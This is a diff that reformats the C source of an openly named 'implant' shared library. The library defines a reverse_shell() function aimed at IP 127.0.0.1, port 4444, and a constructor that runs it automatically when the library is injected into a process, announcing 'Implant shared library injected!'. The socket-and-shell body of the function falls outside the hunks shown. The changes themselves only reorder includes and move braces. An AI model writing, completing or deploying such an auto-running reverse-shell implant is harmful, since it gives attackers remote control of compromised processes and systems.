@@ -1,14 +1,13 @@
+#include <arpa/inet.h>
+#include <netinet/ip.h>
 #include <stdio.h>
 #include <sys/socket.h>
-#include <netinet/ip.h>
-#include <arpa/inet.h>
 #include <unistd.h>
 
 #define IP "127.0.0.1"
 #define PORT 4444
 
-int reverse_shell()
-{
+int reverse_shell() {
     if (fork() != 0)
         return 0;
 
@@ -35,8 +34,7 @@ int reverse_shell()
     return 0;
 }
 
-__attribute__((constructor)) void library_init(void)
-{
+__attribute__((constructor)) void library_init(void) {
     puts("Implant shared library injected!");
     puts("To list processes with their pid, ppid, cmd, use \"ps -eo pid,ppid,cmd\"");
     reverse_shell();
